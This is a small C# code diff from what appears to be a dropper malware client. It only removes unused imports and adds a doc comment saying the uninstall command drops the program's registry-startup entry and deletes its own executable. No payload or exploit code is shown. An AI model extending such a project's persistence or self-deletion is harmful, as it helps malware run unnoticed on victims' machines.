@@ -1,8 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using DropperClient.Installation;
 using Microsoft.Win32;
 
@@ -10,6 +6,10 @@ namespace DropperClient.Command
 {
     internal class UninstallCommand : ICommand
     {
+        /// <summary>
+        /// Tries to remove itself from registry startup and then delete the .exe
+        /// </summary>
+        /// <returns></returns>
         public bool Execute()
         {
             var execInfo = new ExecutableInfo();
